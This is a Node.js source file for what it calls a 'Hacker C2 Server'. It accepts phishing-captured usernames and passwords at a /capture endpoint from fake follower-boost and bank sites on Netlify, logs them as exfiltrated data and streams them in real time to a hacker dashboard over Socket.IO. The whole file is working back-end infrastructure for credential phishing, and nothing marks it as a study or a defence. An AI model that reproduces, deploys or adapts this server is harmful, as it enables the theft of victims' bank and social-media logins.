const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");

const app = express();

/* ===============================
   ✅ Allowed origins
================================ */
const allowedOrigins = [
  "https://instafollowersboost12.netlify.app",
  "https://globaldigitalbank1.netlify.app",
    "https://hackerspanel.netlify.app",
  "http://127.0.0.1:5500"                                                                                                                       
];

/* ===============================
   ✅ EXPRESS CORS (FUNCTION MODE)
================================ */
app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true); // allow server-to-server
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    }
    return callback(new Error("CORS not allowed"), false);
  },
  methods: ["GET", "POST"],
  credentials: true
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

/* ===============================
   ✅ HTTP SERVER
================================ */
const server = http.createServer(app);

/* ===============================
   ✅ SOCKET.IO WITH FULL CORS
================================ */
const io = new Server(server, {
  cors: {
    origin: function (origin, callback) {
      if (!origin) return callback(null, true);
      if (allowedOrigins.includes(origin)) {
        return callback(null, true);
      }
      return callback(new Error("Socket CORS blocked"), false);
    },
    methods: ["GET", "POST"],
    credentials: true
  },
  transports: ["polling", "websocket"]
});

/* ===============================
   ✅ SOCKET EVENTS
================================ */
io.on("connection", (socket) => {
  console.log("🟢 Hacker dashboard connected:", socket.id);

  socket.on("disconnect", () => {
    console.log("🔴 Hacker dashboard disconnected:", socket.id);
  });
});

/* ===============================
   ✅ CAPTURE ENDPOINT
================================ */
app.post("/capture", (req, res) => {
  const logEntry = {
    time: new Date().toLocaleTimeString(),
    user: req.body.user || "unknown",
    pass: req.body.pass || "***",
    type: req.body.type || "PHISHING"
  };

  console.log("📡 Exfiltrated Data:", logEntry);

  io.emit("new_data", logEntry);

  res.status(200).json({
    status: "Captured",
    data: logEntry
  });
});

/* ===============================
   ✅ TEST ROUTE
================================ */
app.get("/", (req, res) => {
  res.send("Hacker C2 Server Running 🚀");
});

/* ===============================
   ✅ START SERVER
================================ */
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`🔥 Hacker Stream Server running on port ${PORT}`);
});
